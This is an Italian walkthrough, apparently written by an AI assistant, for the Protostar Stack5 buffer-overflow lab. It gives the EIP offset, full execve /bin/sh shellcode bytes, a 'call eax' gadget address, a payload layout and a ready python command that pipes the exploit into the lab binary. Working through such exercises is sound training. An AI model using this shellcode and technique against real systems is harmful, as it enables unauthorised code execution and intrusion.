Ecco una soluzione completa per **Protostar Stack5**, basata su fonti affidabili:

---

## 🎯 Obiettivo

Hai un programma vulnerabile con `gets(buffer)` su un array di 64 byte. Lo scopo è iniettare shellcode nella stack e **sovrascrivere il ritorno**, così da eseguire `/bin/sh`.

---

## 1. Trovare l’offset EIP

Tramite GDB, possiamo stabilire il punto in cui iniziano ad essere sovrascritti gli **EIP**. A 76 byte circa (buffer 64 + 12 di padding), una stringa di 76 `A` genera crash con EIP=“AAAA…” ([0xRick's Blog][1]).

---

## 2. Shellcode da usare

Una shellcode Execve `"/bin/sh"` (32‑bit) funziona bene e riapre stdin grazie a `gets()` ([Medium][2], [dylandsouza.tech][3]).

Ad esempio:

```
\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3
\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh
\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

---

## 3. Dove puntare l’EIP?

Il programma fa:

```
lea eax, [esp+0x10]
call gets
leave
ret
```

Quindi **EAX** contiene l’indirizzo del buffer sullo stack. Bisogna trovare un gadget `call eax` statico, presente nel binario:

```
0x080483bf   call eax
0x0804846b   call eax
```

Così EIP viene sovrascritto con uno di questi indirizzi e salta al buffer sullo stack ([Ayrx's Blog][4], [Medium][2]).

---

## 4. Costruire il payload

Un exploit tipico:

```python
payload = b'\x83\xc4\x10' + shellcode
payload += b'A' * padding
payload += p32(0x080483bf)   # indirizzo ‘call eax’ in little‑endian
```

Nel lavoro di coturnix97 si usano **18 byte di padding** tra shellcode e indirizzo in fondo per evitare overwrite da parte degli `push` dello shellcode — oppure si può aggiungere uno **stack adjust** (`add $0x10, %esp`, opcode `\x83\xc4\x10`) prima della shellcode ([YouTube][5], [Ayrx's Blog][4]).

Ad esempio:

```sh
python -c "print '\x83\xc4\x10' + SHELLCODE + 'A'*18 + '\xbf\x83\x04\x08'" | /opt/protostar/bin/stack5
```

In alternativa, si può usare un **NOP sled** (`\x90` ripetuto), utile se l’indirizzo preciso cambia leggermente ([DEV Community][6]).

---

## 5. Debug durante la scrittura

Puoi usare `\xCC` (istruzione `int3`) in cima al payload (al posto dello shellcode) per garantire che l’esecuzione salti davvero al tuo buffer: GDB ti segnalerà una trap se funziona. Ricordati di **rimuovere i `\xCC`** una volta confermata l’esecuzione ([Medium][7]).

---

## 📋 Sintesi

| Fase           | Descrizione                                                                           |
| -------------- | ------------------------------------------------------------------------------------- |
| **Offset EIP** | \~76 byte da buffer inizio a EIP                                                      |
| **Shellcode**  | Execve `/bin/sh` da exploit-db o shell‑storm                                          |
| **Gadget**     | `call eax` al caricamento di EAX con indirizzo del buffer                             |
| **Payload**    | `<stack adjust?> + NOP sled (opzionale) + shellcode + padding + indirizzo 'call eax'` |
| **Testing**    | Usa `\xCC` per debug, poi rimuovilo                                                   |

---

## 💡 Un esempio concreto (da medium e blog)

* Offset 76 byte.
* Gadget: `0x080483bf` (`\xbf\x83\x04\x08`).
* Shellcode con `add esp, 0x10` per overflow di stack.
* Padding di 18 byte tra shellcode e indirizzo.
* Shell root attivabile con `(python payload; cat) | ./stack5` ([Medium][2], [0xRick's Blog][1], [Ayrx's Blog][4]).

---

## ✅ Conclusione

Questo exploit sfrutta:

1. buffer overflow classico con **offset 76 byte**,
2. esecuzione di **shellcode** posizionato nello stack,
3. redirezione di EIP verso il buffer usando un **gadget call eax** nel binario,
4. possibilmente uno **stack adjust** per evitare corruption,
5. e debug con breakpoints `int3`.

[1]: https://0xrick.github.io/binary-exploitation/bof5/?utm_source=chatgpt.com "Buffer Overflow Examples, Code execution by shellcode injection"
[2]: https://medium.com/%40coturnix97/exploit-exercises-protostar-stack-5-963731ff4b71?utm_source=chatgpt.com "Exploit-Exercises Protostar Stack 5 | by coturnix97 - Medium"
[3]: https://dylandsouza.tech/proto-stack5/?utm_source=chatgpt.com "Protostar Writeup - stack5 - Dylan Dsouza"
[4]: https://www.ayrx.me/protostar-walkthrough-stack/?utm_source=chatgpt.com "Protostar Walkthrough - Stack | Ayrx's Blog"
[5]: https://www.youtube.com/watch?v=HDZ3FVH1YLc&utm_source=chatgpt.com "Exploit-Exercises Protostar Stack5 Exploit - YouTube"
[6]: https://dev.to/hextrace/jump-into-local-shellcode-protostar-stack5-57mb?utm_source=chatgpt.com "Jump into shellcode (protostar - stack5) - DEV Community"
[7]: https://medium.com/%40karkisulav31/stack-5-protostar-exploit-education-39e2d75437c5?utm_source=chatgpt.com "Stack 5 — Protostar — Exploit Education — ShellCode Challenge"
